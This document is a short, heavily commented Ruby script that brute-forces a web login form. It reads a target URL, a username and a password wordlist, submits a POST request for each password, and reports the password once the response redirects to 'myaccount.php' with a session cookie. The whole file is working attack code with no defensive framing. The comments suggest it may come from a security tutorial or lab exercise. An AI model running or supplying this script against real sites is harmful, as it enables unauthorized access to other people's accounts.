# Import the 'net/http' library
require 'net/http'

# Extract command-line arguments for target URL, username, and password file
Target = ARGV[0]
User = ARGV[1]
Password_file = ARGV[2]

# Parse the target URL
url = URI(Target)

# Initialize parameters with the provided username
params = { "user" => User }

# Create an HTTP connection to the target
http = Net::HTTP.start(url.hostname)

# Create an HTTP POST request for the target URL
req = Net::HTTP::Post.new(url.request_uri)

# Open the specified password file for reading
File.open(Password_file, 'r') do |file|
  # Iterate through each line (password) in the file
  real_pwd = file.each do |pwd|
    # Remove trailing newline character from the password
    params['pass'] = pwd.chop
    
    # Set form data and make an HTTP POST request
    req.set_form_data(params)
    res = http.request(req)

    # Break the loop if the login is successful
    break pwd if (res['location'] == 'myaccount.php' && res['set-cookie'])
  end

  # Print the discovered password if it is a string
  puts "\nPassword for '#{User}' is: " + real_pwd if real_pwd.is_a? String
end

# Close the HTTP connection
http.finish
